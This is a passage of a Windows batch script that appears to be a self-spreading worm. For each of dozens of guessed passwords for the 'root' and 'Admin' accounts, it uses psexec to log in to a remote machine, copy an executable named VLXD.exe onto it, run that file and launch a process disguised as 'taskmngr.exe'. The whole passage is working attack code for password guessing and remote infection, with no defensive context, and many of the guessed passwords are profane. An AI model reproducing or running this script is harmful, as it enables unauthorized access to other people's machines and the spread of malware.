   psexec \\%1 -u root -p "bitch" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "bitch" -d taskmngr.exe
   psexec \\%1 -u root -p "bitch" -d VLXD.exe -o
   psexec \\%1 -u root -p "bitch" -d taskmngr.exe
   goto end
   :rootfault
   psexec \\%1 -u root -p "fault" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "fault" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "fault" -d taskmngr.exe
   psexec \\%1 -u root -p "fault" -d VLXD.exe -o
   psexec \\%1 -u root -p "fault" -d taskmngr.exe
   goto end
   :rootcat
   psexec \\%1 -u root -p "cat" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "cat" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "cat" -d taskmngr.exe
   psexec \\%1 -u root -p "cat" -d VLXD.exe -o
   psexec \\%1 -u root -p "cat" -d taskmngr.exe
   goto end
   :root911
   psexec \\%1 -u root -p "911" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "911" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "911" -d taskmngr.exe
   psexec \\%1 -u root -p "911" -d VLXD.exe -o
   psexec \\%1 -u root -p "911" -d taskmngr.exe
   goto end
   :roottowers
   psexec \\%1 -u root -p "towers" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "towers" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "towers" -d taskmngr.exe
   psexec \\%1 -u root -p "towers" -d VLXD.exe -o
   psexec \\%1 -u root -p "towers" -d taskmngr.exe
   goto end
   :root123
   psexec \\%1 -u root -p "123" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "123" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "123" -d taskmngr.exe
   psexec \\%1 -u root -p "123" -d VLXD.exe -o
   psexec \\%1 -u root -p "123" -d taskmngr.exe
   goto end
   :root1234
   psexec \\%1 -u root -p "1234" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "1234" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "1234" -d taskmngr.exe
   psexec \\%1 -u root -p "1234" -d VLXD.exe -o
   psexec \\%1 -u root -p "1234" -d taskmngr.exe
   goto end
   :root12345
   psexec \\%1 -u root -p "12345" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "12345" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "12345" -d taskmngr.exe
   psexec \\%1 -u root -p "12345" -d VLXD.exe -o
   psexec \\%1 -u root -p "12345" -d taskmngr.exe
   goto end
   :root123456
   psexec \\%1 -u root -p "123456" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "123456" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "123456" -d taskmngr.exe
   psexec \\%1 -u root -p "123456" -d VLXD.exe -o
   psexec \\%1 -u root -p "123456" -d taskmngr.exe
   goto end
   :root654321
   psexec \\%1 -u root -p "654321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "654321" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "654321" -d taskmngr.exe
   psexec \\%1 -u root -p "654321" -d VLXD.exe -o
   psexec \\%1 -u root -p "654321" -d taskmngr.exe
   goto end
   :root54321
   psexec \\%1 -u root -p "54321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "54321" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "54321" -d taskmngr.exe
   psexec \\%1 -u root -p "54321" -d VLXD.exe -o
   psexec \\%1 -u root -p "54321" -d taskmngr.exe
   goto end
   :root321
   psexec \\%1 -u root -p "321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "321" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "321" -d taskmngr.exe
   psexec \\%1 -u root -p "321" -d VLXD.exe -o
   psexec \\%1 -u root -p "321" -d taskmngr.exe
   goto end
   :rootroot
   psexec \\%1 -u root -p "root" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "root" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "root" -d taskmngr.exe
   psexec \\%1 -u root -p "root" -d VLXD.exe -o
   psexec \\%1 -u root -p "root" -d taskmngr.exe
   goto end
   :root4321
   psexec \\%1 -u root -p "4321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "4321" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "4321" -d taskmngr.exe
   psexec \\%1 -u root -p "4321" -d VLXD.exe -o
   psexec \\%1 -u root -p "4321" -d taskmngr.exe
   goto end
   :roottemp
   psexec \\%1 -u root -p "temp" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "temp" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "temp" -d taskmngr.exe
   psexec \\%1 -u root -p "temp" -d VLXD.exe -o
   psexec \\%1 -u root -p "temp" -d taskmngr.exe
   goto end
   :rootroot
   psexec \\%1 -u root -p "root" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "root" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "root" -d taskmngr.exe
   psexec \\%1 -u root -p "root" -d VLXD.exe -o
   psexec \\%1 -u root -p "root" -d taskmngr.exe
   goto end
   :rootbootie
   psexec \\%1 -u root -p "bootie" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "bootie" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "bootie" -d taskmngr.exe
   psexec \\%1 -u root -p "bootie" -d VLXD.exe -o
   psexec \\%1 -u root -p "bootie" -d taskmngr.exe
   goto end
   :rootpoop
   psexec \\%1 -u root -p "poop" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "poop" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "poop" -d taskmngr.exe
   psexec \\%1 -u root -p "poop" -d VLXD.exe -o
   psexec \\%1 -u root -p "poop" -d taskmngr.exe
   goto end
   :rootpoopie
   psexec \\%1 -u root -p "poopie" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "poopie" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "poopie" -d taskmngr.exe
   psexec \\%1 -u root -p "poopie" -d VLXD.exe -o
   psexec \\%1 -u root -p "poopie" -d taskmngr.exe
   goto end
   :rootweed
   psexec \\%1 -u root -p "weed" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "weed" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "weed" -d taskmngr.exe
   psexec \\%1 -u root -p "weed" -d VLXD.exe -o
   psexec \\%1 -u root -p "weed" -d taskmngr.exe
   goto end
   :rootwater
   psexec \\%1 -u root -p "water" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "water" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "water" -d taskmngr.exe
   psexec \\%1 -u root -p "water" -d VLXD.exe -o
   psexec \\%1 -u root -p "water" -d taskmngr.exe
   goto end
   :rootcool
   psexec \\%1 -u root -p "cool" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "cool" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "cool" -d taskmngr.exe
   psexec \\%1 -u root -p "cool" -d VLXD.exe -o
   psexec \\%1 -u root -p "cool" -d taskmngr.exe
   goto end
   :rootjoint
   psexec \\%1 -u root -p "joint" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "joint" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "joint" -d taskmngr.exe
   psexec \\%1 -u root -p "joint" -d VLXD.exe -o
   psexec \\%1 -u root -p "joint" -d taskmngr.exe
   goto end
   :rootcrack
   psexec \\%1 -u root -p "crack" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "crack" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "crack" -d taskmngr.exe
   psexec \\%1 -u root -p "crack" -d VLXD.exe -o
   psexec \\%1 -u root -p "crack" -d taskmngr.exe
   goto end
   :rootdanger
   psexec \\%1 -u root -p "danger" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "danger" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "danger" -d taskmngr.exe
   psexec \\%1 -u root -p "danger" -d VLXD.exe -o
   psexec \\%1 -u root -p "danger" -d taskmngr.exe
   goto end
   :rootweiner
   psexec \\%1 -u root -p "weiner" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "weiner" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "weiner" -d taskmngr.exe
   psexec \\%1 -u root -p "weiner" -d VLXD.exe -o
   psexec \\%1 -u root -p "weiner" -d taskmngr.exe
   goto end
   :rootelectrical
   psexec \\%1 -u root -p "electrical" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "electrical" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "electrical" -d taskmngr.exe
   psexec \\%1 -u root -p "electrical" -d VLXD.exe -o
   psexec \\%1 -u root -p "electrical" -d taskmngr.exe
   goto end
   :rootelectric
   psexec \\%1 -u root -p "electric" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "electric" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "electric" -d taskmngr.exe
   psexec \\%1 -u root -p "electric" -d VLXD.exe -o
   psexec \\%1 -u root -p "electric" -d taskmngr.exe
   goto end
   :rootelectricity
   psexec \\%1 -u root -p "electricity" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "electricity" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "electricity" -d taskmngr.exe
   psexec \\%1 -u root -p "electricity" -d VLXD.exe -o
   psexec \\%1 -u root -p "electricity" -d taskmngr.exe
   goto end
   :rootpenis
   psexec \\%1 -u root -p "penis" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "penis" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "penis" -d taskmngr.exe
   psexec \\%1 -u root -p "penis" -d VLXD.exe -o
   psexec \\%1 -u root -p "penis" -d taskmngr.exe
   goto end
   :rootcent
   psexec \\%1 -u root -p "cent" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "cent" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "cent" -d taskmngr.exe
   psexec \\%1 -u root -p "cent" -d VLXD.exe -o
   psexec \\%1 -u root -p "cent" -d taskmngr.exe
   goto end
   :root50cent
   psexec \\%1 -u root -p "50cent" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "50cent" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "50cent" -d taskmngr.exe
   psexec \\%1 -u root -p "50cent" -d VLXD.exe -o
   psexec \\%1 -u root -p "50cent" -d taskmngr.exe
   goto end
   :rooteminem
   psexec \\%1 -u root -p "eminem" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "eminem" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "eminem" -d taskmngr.exe
   psexec \\%1 -u root -p "eminem" -d VLXD.exe -o
   psexec \\%1 -u root -p "eminem" -d taskmngr.exe
   goto end
   :rootvagina
   psexec \\%1 -u root -p "vagina" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "vagina" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "vagina" -d taskmngr.exe
   psexec \\%1 -u root -p "vagina" -d VLXD.exe -o
   psexec \\%1 -u root -p "vagina" -d taskmngr.exe
   goto end
   :rootcunt
   psexec \\%1 -u root -p "cunt" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "cunt" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "cunt" -d taskmngr.exe
   psexec \\%1 -u root -p "cunt" -d VLXD.exe -o
   psexec \\%1 -u root -p "cunt" -d taskmngr.exe
   goto end
   :rootpussy
   psexec \\%1 -u root -p "pussy" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "pussy" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "pussy" -d taskmngr.exe
   psexec \\%1 -u root -p "pussy" -d VLXD.exe -o
   psexec \\%1 -u root -p "pussy" -d taskmngr.exe
   goto end
   :rootcock
   psexec \\%1 -u root -p "cock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "cock" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "cock" -d taskmngr.exe
   psexec \\%1 -u root -p "cock" -d VLXD.exe -o
   psexec \\%1 -u root -p "cock" -d taskmngr.exe
   goto end
   :rootdick
   psexec \\%1 -u root -p "dick" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "dick" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "dick" -d taskmngr.exe
   psexec \\%1 -u root -p "dick" -d VLXD.exe -o
   psexec \\%1 -u root -p "dick" -d taskmngr.exe
   psexec \\%1 -u root -p dick -c -f -d VLXD.exe
   goto end
   :rootshithead
   psexec \\%1 -u root -p "shithead" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "shithead" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "shithead" -d taskmngr.exe
   psexec \\%1 -u root -p "shithead" -d VLXD.exe -o
   psexec \\%1 -u root -p "shithead" -d taskmngr.exe
   goto end
   :rootshotgun
   psexec \\%1 -u root -p "shotgun" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "shotgun" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "shotgun" -d taskmngr.exe
   psexec \\%1 -u root -p "shotgun" -d VLXD.exe -o
   psexec \\%1 -u root -p "shotgun" -d taskmngr.exe
   goto end
   :rootblunt
   psexec \\%1 -u root -p "blunt" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "blunt" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "blunt" -d taskmngr.exe
   psexec \\%1 -u root -p "blunt" -d VLXD.exe -o
   psexec \\%1 -u root -p "blunt" -d taskmngr.exe
   goto end
   :rootglock
   psexec \\%1 -u root -p "glock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "glock" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "glock" -d taskmngr.exe
   psexec \\%1 -u root -p "glock" -d VLXD.exe -o
   psexec \\%1 -u root -p "glock" -d taskmngr.exe
   goto end
   :rootexecutable
   psexec \\%1 -u root -p "executable" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "executable" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "executable" -d taskmngr.exe
   psexec \\%1 -u root -p "executable" -d VLXD.exe -o
   psexec \\%1 -u root -p "executable" -d taskmngr.exe
   goto end
   :rootbong
   psexec \\%1 -u root -p "bong" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "bong" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "bong" -d taskmngr.exe
   psexec \\%1 -u root -p "bong" -d VLXD.exe -o
   psexec \\%1 -u root -p "bong" -d taskmngr.exe
   goto end
   :rootdildo
   psexec \\%1 -u root -p "dildo" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "dildo" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "dildo" -d taskmngr.exe
   psexec \\%1 -u root -p "dildo" -d VLXD.exe -o
   psexec \\%1 -u root -p "dildo" -d taskmngr.exe
   goto end
   :rootbaseball
   psexec \\%1 -u root -p "baseball" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "baseball" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "baseball" -d taskmngr.exe
   psexec \\%1 -u root -p "baseball" -d VLXD.exe -o
   psexec \\%1 -u root -p "baseball" -d taskmngr.exe
   goto end
   :rootbasketball
   psexec \\%1 -u root -p "basketball" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "basketball" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "basketball" -d taskmngr.exe
   psexec \\%1 -u root -p "basketball" -d VLXD.exe -o
   psexec \\%1 -u root -p "basketball" -d taskmngr.exe
   goto end
   :rootfootball
   psexec \\%1 -u root -p "football" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "football" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "football" -d taskmngr.exe
   psexec \\%1 -u root -p "football" -d VLXD.exe -o
   psexec \\%1 -u root -p "football" -d taskmngr.exe
   goto end
   :rootsoccer
   psexec \\%1 -u root -p "soccer" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "soccer" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "soccer" -d taskmngr.exe
   psexec \\%1 -u root -p "soccer" -d VLXD.exe -o
   psexec \\%1 -u root -p "soccer" -d taskmngr.exe
   goto end
   :rootpot
   psexec \\%1 -u root -p "pot" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "pot" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "pot" -d taskmngr.exe
   psexec \\%1 -u root -p "pot" -d VLXD.exe -o
   psexec \\%1 -u root -p "pot" -d taskmngr.exe
   goto end
   :rootdope
   psexec \\%1 -u root -p "dope" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "dope" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "dope" -d taskmngr.exe
   psexec \\%1 -u root -p "dope" -d VLXD.exe -o
   psexec \\%1 -u root -p "dope" -d taskmngr.exe
   goto end
   :rootmaryjane
   psexec \\%1 -u root -p "maryjane" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "maryjane" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "maryjane" -d taskmngr.exe
   psexec \\%1 -u root -p "maryjane" -d VLXD.exe -o
   psexec \\%1 -u root -p "maryjane" -d taskmngr.exe
   goto end
   :rootmarijuana
   psexec \\%1 -u root -p "marijuana" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "marijuana" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "marijuana" -d taskmngr.exe
   psexec \\%1 -u root -p "marijuana" -d VLXD.exe -o
   psexec \\%1 -u root -p "marijuana" -d taskmngr.exe
   goto end
   :rootmoney
   psexec \\%1 -u root -p "money" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "money" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "money" -d taskmngr.exe
   psexec \\%1 -u root -p "money" -d VLXD.exe -o
   psexec \\%1 -u root -p "money" -d taskmngr.exe
   goto end
   :rootgirl
   psexec \\%1 -u root -p "girl" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "girl" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "girl" -d taskmngr.exe
   psexec \\%1 -u root -p "girl" -d VLXD.exe -o
   psexec \\%1 -u root -p "girl" -d taskmngr.exe
   goto end
   :rootgirls
   psexec \\%1 -u root -p "girls" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "girls" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "girls" -d taskmngr.exe
   psexec \\%1 -u root -p "girls" -d VLXD.exe -o
   psexec \\%1 -u root -p "girls" -d taskmngr.exe
   goto end
   :rootwoman
   psexec \\%1 -u root -p "woman" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "woman" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "woman" -d taskmngr.exe
   psexec \\%1 -u root -p "woman" -d VLXD.exe -o
   psexec \\%1 -u root -p "woman" -d taskmngr.exe
   goto end
   :rootwomen
   psexec \\%1 -u root -p "women" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "women" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "women" -d taskmngr.exe
   psexec \\%1 -u root -p "women" -d VLXD.exe -o
   psexec \\%1 -u root -p "women" -d taskmngr.exe
   goto end
   :rootfemale
   psexec \\%1 -u root -p "female" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "female" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "female" -d taskmngr.exe
   psexec \\%1 -u root -p "female" -d VLXD.exe -o
   psexec \\%1 -u root -p "female" -d taskmngr.exe
   goto end
   :rootamerica
   psexec \\%1 -u root -p "america" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "america" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "america" -d taskmngr.exe
   psexec \\%1 -u root -p "america" -d VLXD.exe -o
   psexec \\%1 -u root -p "america" -d taskmngr.exe
   goto end
   :rootusa
   psexec \\%1 -u root -p "usa" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "usa" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "usa" -d taskmngr.exe
   psexec \\%1 -u root -p "usa" -d VLXD.exe -o
   psexec \\%1 -u root -p "usa" -d taskmngr.exe
   goto end
   :rootgod
   psexec \\%1 -u root -p "god" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "god" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "god" -d taskmngr.exe
   psexec \\%1 -u root -p "god" -d VLXD.exe -o
   psexec \\%1 -u root -p "god" -d taskmngr.exe
   goto end
   :rootjesus
   psexec \\%1 -u root -p "jesus" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "jesus" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "jesus" -d taskmngr.exe
   psexec \\%1 -u root -p "jesus" -d VLXD.exe -o
   psexec \\%1 -u root -p "jesus" -d taskmngr.exe
   goto end
   :rootcomputer
   psexec \\%1 -u root -p "computer" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "computer" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "computer" -d taskmngr.exe
   psexec \\%1 -u root -p "computer" -d VLXD.exe -o
   psexec \\%1 -u root -p "computer" -d taskmngr.exe
   goto end
   :roottechnology
   psexec \\%1 -u root -p "technology" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "technology" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "technology" -d taskmngr.exe
   psexec \\%1 -u root -p "technology" -d VLXD.exe -o
   psexec \\%1 -u root -p "technology" -d taskmngr.exe
   goto end
   :rootporn
   psexec \\%1 -u root -p "porn" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "porn" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "porn" -d taskmngr.exe
   psexec \\%1 -u root -p "porn" -d VLXD.exe -o
   psexec \\%1 -u root -p "porn" -d taskmngr.exe
   goto end
   :roothack
   psexec \\%1 -u root -p "hack" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "hack" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "hack" -d taskmngr.exe
   psexec \\%1 -u root -p "hack" -d VLXD.exe -o
   psexec \\%1 -u root -p "hack" -d taskmngr.exe
   goto end
   :rootclock
   psexec \\%1 -u root -p "clock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "clock" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "clock" -d taskmngr.exe
   psexec \\%1 -u root -p "clock" -d VLXD.exe -o
   psexec \\%1 -u root -p "clock" -d taskmngr.exe
   goto end
   :rootchurch
   psexec \\%1 -u root -p "church" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "church" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "church" -d taskmngr.exe
   psexec \\%1 -u root -p "church" -d VLXD.exe -o
   psexec \\%1 -u root -p "church" -d taskmngr.exe
   goto end
   :roottemp
   psexec \\%1 -u root -p "temp" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u root -p "temp" -f -c -d VLXD.exe -o
   psexec \\%1 -u root -p "temp" -d taskmngr.exe
   psexec \\%1 -u root -p "temp" -d VLXD.exe -o
   psexec \\%1 -u root -p "temp" -d taskmngr.exe
   goto end
   :Admin
   psexec \\%1 -u Admin -p "" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "" -d taskmngr.exe
   psexec \\%1 -u Admin -p "" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "" -d taskmngr.exe
   goto end
   :Adminpass123
   psexec \\%1 -u Admin -p "pass123" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "pass123" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "pass123" -d taskmngr.exe
   psexec \\%1 -u Admin -p "pass123" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "pass123" -d taskmngr.exe
   goto end
   :Adminsomething
   psexec \\%1 -u Admin -p "something" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "something" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "something" -d taskmngr.exe
   psexec \\%1 -u Admin -p "something" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "something" -d taskmngr.exe
   goto end
   :Adminmypass
   psexec \\%1 -u Admin -p "mypass" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "mypass" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "mypass" -d taskmngr.exe
   psexec \\%1 -u Admin -p "mypass" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "mypass" -d taskmngr.exe
   goto end
   :Adminlogin
   psexec \\%1 -u Admin -p "login" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "login" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "login" -d taskmngr.exe
   psexec \\%1 -u Admin -p "login" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "login" -d taskmngr.exe
   goto end
   :Adminaccess
   psexec \\%1 -u Admin -p "access" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "access" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "access" -d taskmngr.exe
   psexec \\%1 -u Admin -p "access" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "access" -d taskmngr.exe
   goto end
   :Adminpassword
   psexec \\%1 -u Admin -p "password" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "password" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "password" -d taskmngr.exe
   psexec \\%1 -u Admin -p "password" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "password" -d taskmngr.exe
   goto end
   :Adminmatrix
   psexec \\%1 -u Admin -p "matrix" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "matrix" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "matrix" -d taskmngr.exe
   psexec \\%1 -u Admin -p "matrix" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "matrix" -d taskmngr.exe
   goto end
   :Adminsecurity
   psexec \\%1 -u Admin -p "security" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "security" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "security" -d taskmngr.exe
   psexec \\%1 -u Admin -p "security" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "security" -d taskmngr.exe
   goto end
   :Adminsuccess
   psexec \\%1 -u Admin -p "success" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "success" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "success" -d taskmngr.exe
   psexec \\%1 -u Admin -p "success" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "success" -d taskmngr.exe
   goto end
   :Adminspecial
   psexec \\%1 -u Admin -p "special" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "special" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "special" -d taskmngr.exe
   psexec \\%1 -u Admin -p "special" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "special" -d taskmngr.exe
   goto end
   :Adminultra
   psexec \\%1 -u Admin -p "ultra" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "ultra" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "ultra" -d taskmngr.exe
   psexec \\%1 -u Admin -p "ultra" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "ultra" -d taskmngr.exe
   goto end
   :Adminpass
   psexec \\%1 -u Admin -p "pass" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "pass" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "pass" -d taskmngr.exe
   psexec \\%1 -u Admin -p "pass" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "pass" -d taskmngr.exe
   goto end
   :Adminenable
   psexec \\%1 -u Admin -p "enable" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "enable" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "enable" -d taskmngr.exe
   psexec \\%1 -u Admin -p "enable" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "enable" -d taskmngr.exe
   goto end
   :Adminpasswd
   psexec \\%1 -u Admin -p "passwd" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "passwd" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "passwd" -d taskmngr.exe
   psexec \\%1 -u Admin -p "passwd" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "passwd" -d taskmngr.exe
   goto end
   :Admininternet
   psexec \\%1 -u Admin -p "internet" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "internet" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "internet" -d taskmngr.exe
   psexec \\%1 -u Admin -p "internet" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "internet" -d taskmngr.exe
   goto end
   :Adminnetwork
   psexec \\%1 -u Admin -p "network" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "network" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "network" -d taskmngr.exe
